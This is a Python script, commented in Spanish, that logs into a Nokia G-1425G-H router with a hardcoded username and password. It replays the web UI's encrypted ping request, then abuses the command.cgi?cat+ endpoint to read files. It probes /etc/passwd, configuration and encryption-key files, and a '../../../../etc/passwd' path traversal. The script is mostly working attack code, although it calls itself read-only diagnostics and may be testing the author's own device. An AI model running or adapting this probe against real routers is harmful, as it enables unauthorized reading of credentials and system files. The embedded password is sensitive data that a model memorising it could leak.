#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
MF-6.1 — test_diag_ping_and_cat (solo lectura / diagnostico)

Prueba limpia y controlada del par `diag.cgi?ping` + `command.cgi?cat+<archivo>`
contra el router Nokia G-1425G-H de Telmex (192.168.99.254), con login -> prueba
-> logout SIEMPRE garantizado en `finally`.

Objetivo (ver Pizarra/04_fase3_extraccion_y_criptografia.md MF-3.5 / MF-6.1):
  1. Reproducir EXACTO el ping de 1 paquete a 127.0.0.1 via POST /diag.cgi?ping
     (cuerpo cifrado RSA+AES via crypto_page.encrypt_post_data, igual que hace
     el JS real porque $('form').serialize() NUNCA esta vacio).
  2. Observar la cadena `f` (nombre de archivo temporal) que devuelve el router.
  3. Reproducir el POST /command.cgi?cat+<f> EXACTAMENTE como lo hace `cat(f)`:
     $.post('command.cgi?cat+'+f, callback) -> jQuery NO manda `data` ->
     ajaxSend ve settings.data === undefined -> NO cifra, solo antepone
     'csrf_token=<tok>' en claro.
  4. Con el mismo patron (`command.cgi?cat+<ruta>` + csrf_token en claro),
     sondear si el endpoint acepta SOLO los nombres de archivo que el propio
     `diag.cgi?ping` genero, o si permite leer rutas arbitrarias del sistema
     (candidatos de solo lectura: /tmp/, /configs/, /etc/passwd, /etc/config/).

NINGUNA de estas pruebas modifica el estado del router (ping es una operacion
de diagnostico nativa de la UI; cat+ es, en el peor caso, una lectura). Logout
garantizado en finally.
"""

import json
import os
import re
import sys
import urllib.error
import urllib.request

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from nokia_auth import (  # noqa: E402
    make_opener,
    _Pass2xxErrorProcessor,
    authenticate_nokia,
    logout_nokia,
    encrypt_post_data,
)

IP = "192.168.99.254"
USER = "TELMEX"
PASSWORD = "sf3h5zkdtA"

_RE_PUBKEY = re.compile(
    r"var\s+pubkey\s*=\s*'(-----BEGIN PUBLIC KEY-----.*?-----END PUBLIC KEY-----)",
    re.DOTALL,
)
_RE_CSRF_AJAXSEND = re.compile(r"settings\.data\s*=\s*'csrf_token=([^']+)'")
_RE_CSRF_HIDDEN = re.compile(r'name="csrf_token"\s+value="([^"]+)"')


def _normalize_pem(raw):
    cleaned = raw.replace('\\\r\n', '\n').replace('\\\n', '\n').replace('\\', '')
    lines = [ln.strip() for ln in cleaned.splitlines() if ln.strip()]
    return "\n".join(lines) + "\n"


def _get(opener, url, timeout=12, extra_headers=None):
    req = urllib.request.Request(url, headers=extra_headers or {})
    try:
        with opener.open(req, timeout=timeout) as r:
            return getattr(r, "status", r.getcode()), r.read(), dict(r.headers.items())
    except urllib.error.HTTPError as e:
        return e.code, e.read(), dict(e.headers.items())


def _post(opener, url, body_bytes, content_type, timeout=12):
    req = urllib.request.Request(
        url, data=body_bytes, method="POST",
        headers={"Content-Type": content_type, "X-Requested-With": "XMLHttpRequest"},
    )
    try:
        with opener.open(req, timeout=timeout) as r:
            return getattr(r, "status", r.getcode()), r.read(), dict(r.headers.items())
    except urllib.error.HTTPError as e:
        return e.code, e.read(), dict(e.headers.items())


def diag_ping_challenge(opener, ip=IP, timeout=12):
    """GET /diag.cgi?ping (sesion autenticada) -> pubkey PEM + csrf_token vigente."""
    status, body, hdrs = _get(opener, "http://%s/diag.cgi?ping" % ip, timeout=timeout)
    html = body.decode("utf-8", errors="replace")
    mpub = _RE_PUBKEY.search(html)
    if not mpub:
        raise ValueError("MF-6.1: no se encontro 'var pubkey' en diag.cgi?ping")
    pubkey = _normalize_pem(mpub.group(1))

    mtok = _RE_CSRF_AJAXSEND.search(html) or _RE_CSRF_HIDDEN.search(html)
    if not mtok:
        raise ValueError("MF-6.1: no se encontro csrf_token en diag.cgi?ping")
    csrf_token = mtok.group(1)

    return {
        "status": status,
        "pubkey": pubkey,
        "csrf_token": csrf_token,
        "html_size": len(html),
        "raw_html_path": None,
    }


def do_ping_1_packet(opener, ip, csrf_token, pubkey, ipaddr="127.0.0.1", timeout=20):
    """
    Replica EXACTA de do_ping() con 1 solo paquete a 127.0.0.1:
      $.post(self.location.href, $('form').serialize())
    $('form').serialize() NUNCA esta vacio (checkall/ipversion/iface/...) =>
    ajaxSend toma la rama ELSE => antepone csrf_token (si falta) y CIFRA
    con crypto_page.encrypt_post_data(pubkey, data).
    """
    plaintext = (
        "csrf_val=&csrf_token=%s&ipversion=ipv4&iface=pp,1,1,1"
        "&ip_address_name=0&ipaddr=%s&checkall=ping&pingcount=1&packetlength=64"
        % (csrf_token, ipaddr)
    )
    encrypted_body = encrypt_post_data(pubkey, plaintext).encode("ascii")

    status, body, hdrs = _post(
        opener,
        "http://%s/diag.cgi?ping" % ip,
        encrypted_body,
        "application/x-www-form-urlencoded; charset=UTF-8",
        timeout=timeout,
    )
    return {
        "request_plaintext": plaintext,
        "request_body_sent": encrypted_body.decode("ascii"),
        "status": status,
        "response_headers": hdrs,
        "response_body_raw": body,
        "response_body_text": body.decode("utf-8", errors="replace"),
        "response_size": len(body),
    }


def do_cat(opener, ip, filename_or_path, csrf_token, timeout=12):
    """
    Replica EXACTA de cat(f):
        $.post('command.cgi?cat+'+f, callback)
    jQuery con (url, successCallback) NO manda `data` => settings.data es
    undefined => ajaxSend ve 'settings.data === undefined' => NO cifra,
    solo hace: settings.data = 'csrf_token=<tok>'.
    """
    url = "http://%s/command.cgi?cat+%s" % (ip, filename_or_path)
    body = ("csrf_token=%s" % csrf_token).encode("ascii")
    status, resp_body, hdrs = _post(
        opener, url, body, "application/x-www-form-urlencoded; charset=UTF-8",
        timeout=timeout,
    )
    text = resp_body.decode("utf-8", errors="replace")
    return {
        "url": url,
        "request_body_sent": body.decode("ascii"),
        "status": status,
        "response_headers": hdrs,
        "response_size": len(resp_body),
        "response_text": text,
        "response_preview": text[:500],
        "starts_with_gt": text.startswith(">"),
    }


def cat_full(opener, ip, filename_or_path, csrf_token, max_polls=20, timeout=12):
    """
    Sigue el protocolo real de paginacion de cat(): mientras la respuesta
    empiece con '>', hay mas datos -> volver a pedir el MISMO archivo.
    Devuelve el texto concatenado + la lista de respuestas crudas (para
    poder distinguir "existe pero vacio" de "no existe"/"denegado").
    """
    chunks = []
    raw_responses = []
    for _ in range(max_polls):
        r = do_cat(opener, ip, filename_or_path, csrf_token, timeout=timeout)
        raw_responses.append({"status": r["status"], "preview": r["response_preview"]})
        if r["status"] != 200:
            break
        if r["starts_with_gt"]:
            chunks.append(r["response_text"][1:])
            continue
        else:
            chunks.append(r["response_text"])
            break
    return {"text": "".join(chunks), "polls": raw_responses}


def main():
    outdir = "/tmp/nokia_recon/mf6_1"
    os.makedirs(outdir, exist_ok=True)
    report = {"ip": IP, "steps": []}

    opener, cj = make_opener()
    opener.add_handler(_Pass2xxErrorProcessor())

    auth = None
    try:
        # 1) LOGIN
        auth = authenticate_nokia(opener, ip=IP, user=USER, password=PASSWORD)
        report["login"] = {
            "status": auth["status"], "success": auth["success"], "x_sid": auth["x_sid"],
        }
        if not auth["success"]:
            print(json.dumps(report, indent=2, ensure_ascii=False))
            return 1
        print("LOGIN OK status=%s x_sid=%s" % (auth["status"], auth["x_sid"]))

        # 2) GET diag.cgi?ping -> pubkey + csrf_token vigente de ESTA sesion
        chall = diag_ping_challenge(opener, IP)
        print("diag.cgi?ping GET -> status=%s csrf_token=%s html_size=%s"
              % (chall["status"], chall["csrf_token"], chall["html_size"]))
        report["diag_ping_challenge"] = {
            "status": chall["status"], "csrf_token": chall["csrf_token"],
            "html_size": chall["html_size"],
        }

        # 3) POST diag.cgi?ping -- ping real de 1 paquete a 127.0.0.1 (cifrado)
        ping = do_ping_1_packet(opener, IP, chall["csrf_token"], chall["pubkey"],
                                 ipaddr="127.0.0.1")
        print("POST diag.cgi?ping (1 pkt a 127.0.0.1) -> status=%s size=%s"
              % (ping["status"], ping["response_size"]))
        print("  body enviado (cifrado): %s" % ping["request_body_sent"][:120])
        print("  respuesta cruda (candidato a filename 'f'): %r"
              % ping["response_body_text"][:300])
        report["ping_post"] = {
            "status": ping["status"],
            "request_plaintext": ping["request_plaintext"],
            "response_text": ping["response_body_text"],
            "response_size": ping["response_size"],
        }

        f = ping["response_body_text"].strip()
        report["recovered_filename_f"] = f

        # 4) POST command.cgi?cat+<f> -- EXACTO como cat(f): SIN cifrar
        if f:
            cat_result = cat_full(opener, IP, f, chall["csrf_token"])
            print("POST command.cgi?cat+%s -> %d polls, texto final (preview): %r"
                  % (f, len(cat_result["polls"]), cat_result["text"][:300]))
            report["cat_of_ping_result_file"] = {
                "filename": f,
                "polls": cat_result["polls"],
                "full_text": cat_result["text"],
            }
        else:
            print("ADVERTENCIA: diag.cgi?ping no devolvio una cadena 'f' utilizable "
                  "(revisar response_body_text arriba; puede venir cifrada con la "
                  "clave efimera enckey/enciv del login si el CGI tambien aplica "
                  "AES-CBC a su respuesta).")
            report["cat_of_ping_result_file"] = None

        # 5) Sondeo de alcance de command.cgi?cat+ (SOLO LECTURA, candidatos típicos)
        probe_paths = [
            "/tmp/ping_result",            # variante hipotética sin sesión
            "/tmp/config.cfg",
            "/tmp/backup.cfg",
            "/tmp/dmdb_encryption.cfg",
            "/configs/config.cfg",
            "/configs/",
            "/etc/passwd",
            "/etc/config/",
            "../../../../etc/passwd",
        ]
        probes = {}
        for p in probe_paths:
            try:
                r = do_cat(opener, IP, p, chall["csrf_token"])
                probes[p] = {
                    "status": r["status"],
                    "response_size": r["response_size"],
                    "preview": r["response_preview"],
                }
                print("  probe cat+%-35s -> status=%s size=%s preview=%r"
                      % (p, r["status"], r["response_size"], r["response_preview"][:120]))
            except Exception as e:  # noqa: BLE001
                probes[p] = {"error": repr(e)}
                print("  probe cat+%-35s -> ERROR %r" % (p, e))
        report["path_traversal_probes"] = probes

    finally:
        if opener is not None:
            lo = logout_nokia(opener, ip=IP)
            report["logout_status"] = lo
            print("LOGOUT GET /login.cgi?out -> %s" % lo)

    out_path = os.path.join(outdir, "mf6_1_report.json")
    with open(out_path, "w", encoding="utf-8") as fh:
        json.dump(report, fh, indent=2, ensure_ascii=False)
    print("\nReporte completo guardado en: %s" % out_path)
    return 0


if __name__ == "__main__":
    sys.exit(main())
